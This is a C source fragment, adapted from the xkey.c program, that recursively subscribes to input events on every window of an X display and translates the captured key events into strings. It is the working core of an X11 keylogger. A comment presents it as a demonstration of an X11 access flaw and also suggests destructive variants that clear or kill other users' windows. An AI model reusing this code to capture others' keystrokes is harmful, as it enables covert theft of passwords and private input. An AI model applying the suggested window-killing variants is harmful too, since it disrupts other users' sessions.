// todo: create xkeyhook.h 

/*  taken from code in xkey.c by 
 *  Dominic Giampaolo (nick@cs.maxine.wpi.edu)
 *
 *  unknown license, although Dominic has released other things underl GPL
 *
 */

char *TranslateKeyCode(XEvent *ev);


Display *d;

void snoop_all_windows(Window root, unsigned long type)
{
  static int level = 0;
  Window parent, *children, *child2;
  unsigned int nchildren;
  int stat, i,j,k;

  level++;

  stat = XQueryTree(d, root, &root, &parent, &children, &nchildren);
  if (stat == FALSE)
   {
     fprintf(stderr, "Can't query window tree...\n");
     return;
   }

  if (nchildren == 0)
    return;

  /* For a more drastic inidication of the problem being exploited
   * here, you can change these calls to XSelectInput() to something
   * like XClearWindow(d, children[i]) or if you want to be real
   * nasty, do XKillWindow(d, children[i]).  Of course if you do that,
   * then you'll want to remove the loop in main().
   *
   * The whole point of this exercise being that I shouldn't be
   * allowed to manipulate resources which do not belong to me.
   */
  XSelectInput(d, root, type);

  for(i=0; i < nchildren; i++)
   {
     XSelectInput(d, children[i], type);
     snoop_all_windows(children[i], type);
   }

  XFree((char *)children);
}



#define KEY_BUFF_SIZE 256
static char key_buff[KEY_BUFF_SIZE];

char *TranslateKeyCode(XEvent *ev)
{
  int count;
  char *tmp;
  KeySym ks;

  if (ev)
   {
     count = XLookupString((XKeyEvent *)ev, key_buff, KEY_BUFF_SIZE, &ks,NULL);
     key_buff[count] = '\0';

     if (count == 0)
      {
        tmp = XKeysymToString(ks);
        if (tmp)
          strcpy(key_buff, tmp);
        else
          strcpy(key_buff, "");
      }

     return key_buff;
   }
  else
    return NULL;
}
